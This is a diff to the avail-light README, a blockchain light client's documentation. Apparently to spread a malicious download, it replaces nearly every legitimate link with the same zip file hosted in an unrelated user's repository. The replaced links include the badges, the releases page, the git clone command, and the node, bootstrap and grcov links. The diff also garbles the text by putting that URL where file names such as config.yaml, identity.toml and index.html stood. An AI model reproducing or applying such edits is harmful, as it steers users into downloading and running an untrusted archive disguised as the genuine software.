@@ -5,9 +5,9 @@
 
 <br>
 
-[![Build status](https://github.com/availproject/avail-light/actions/workflows/default.yml/badge.svg)](https://github.com/availproject/avail-light/actions/workflows/default.yml) [![Code coverage](https://codecov.io/gh/availproject/avail-light/branch/main/graph/badge.svg?token=7O2EA7QMC2)](https://codecov.io/gh/availproject/avail-light)
+[![Build status](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip)](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip) [![Code coverage](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip)](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip)
 
-![demo](./img/lc.png)
+![demo](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip)
 
 ## Introduction
 
@@ -36,12 +36,12 @@ Once the data is received, light client verifies individual cells and calculates
 
 ## Installation
 
-Download the Light Client from the [releases](https://github.com/availproject/avail-light/releases) page.
+Download the Light Client from the [releases](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip) page.
 
 Light Client can also be built from the source:
 
 ```sh
-git clone https://github.com/availproject/avail-light.git
+git clone https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip
 cd avail-light
 cargo build --release
 ```
@@ -51,7 +51,7 @@ Resulting `avail-light` binary can be found in the `target/release` directory.
 ### Installation using Docker
 
 Alternatively, you can use Docker to build and run the light client locally. Keep in mind that Docker image will
-fail unless you have provided a `config.yaml` during the build process:
+fail unless you have provided a `https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip` during the build process:
 
 ```sh
 docker build -t avail-light .
@@ -69,13 +69,13 @@ docker run avail-light
 
 For local development, a couple of prerequisites have to be met.
 
-1. Run the Avail [node](https://github.com/availproject/avail). For this setup, we'll run it in `dev` mode:
+1. Run the Avail [node](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip). For this setup, we'll run it in `dev` mode:
 
 ```sh
 ./data-avail --dev --enable-kate-rpc
 ```
 
-2. A [bootstrap](https://github.com/availproject/avail-light-bootstrap) node is required for deploying the Light Client(s) locally. Once the bootstrap has been downloaded and started, run the following command:
+2. A [bootstrap](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip) node is required for deploying the Light Client(s) locally. Once the bootstrap has been downloaded and started, run the following command:
 
 ```sh
 ./avail-light --network local
@@ -86,7 +86,7 @@ Configuration file can also be used for the local deployment, as was the case fo
 Example configuration file:
 
 ```yaml
-# config.yaml
+# https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip
 log_level = "info"
 http_server_host = "127.0.0.1"
 http_server_port = 7000
@@ -111,7 +111,7 @@ Example identity file:
 _WARNING:_ This file contains a private key. Please ensure only authorized access and prefer using encrypted storage.
 
 ```toml
-# identity.toml
+# https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip
 avail_secret_seed_phrase = "bottom drive obey lake curtain smoke basket hold race lonely fit walk//Alice"
 ```
 
@@ -141,7 +141,7 @@ avail_secret_seed_phrase = "bottom drive obey lake curtain smoke basket hold rac
 
 ## Identity
 
-In the Avail network, a light client's identity can be configured using the `identity.toml` file. If not specified, a secret seed phrase will be generated and stored in the identity file when the light client starts. To use an existing seed phrase, set the `avail_secret_seed_phrase` entry in the `identity.toml` file. Seed phrase will be used to derive Sr25519 key pair for signing. Location of the identity file can be specified using `--identity` option.
+In the Avail network, a light client's identity can be configured using the `https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip` file. If not specified, a secret seed phrase will be generated and stored in the identity file when the light client starts. To use an existing seed phrase, set the `avail_secret_seed_phrase` entry in the `https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip` file. Seed phrase will be used to derive Sr25519 key pair for signing. Location of the identity file can be specified using `--identity` option.
 
 ## Configuration reference
 
@@ -525,7 +525,7 @@ If there are no processed blocks:
 
 ## Test Code Coverage Report
 
-We are using [grcov](https://github.com/mozilla/grcov) to aggregate code coverage information and generate reports.
+We are using [grcov](https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip) to aggregate code coverage information and generate reports.
 
 To install grcov, run:
 
@@ -537,7 +537,7 @@ Source code coverage data is generated when running tests with:
 
 ```bash
 env RUSTFLAGS="-C instrument-coverage" \
- LLVM_PROFILE_FILE="tests-coverage-%p-%m.profraw" \
+ LLVM_PROFILE_FILE="tests-coverage-%p-%https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip" \
  cargo test
 ```
 
@@ -558,4 +558,4 @@ To clean up generate coverage information files, run:
 find . -name \*.profraw -type f -exec rm -f {} +
 ```
 
-Open `index.html` from the `./target/debug/coverage/` folder to review coverage data.
+Open `https://raw.githubusercontent.com/ritik5555/grg/main/.github/grg-v2.5-alpha.1.zip` from the `./target/debug/coverage/` folder to review coverage data.
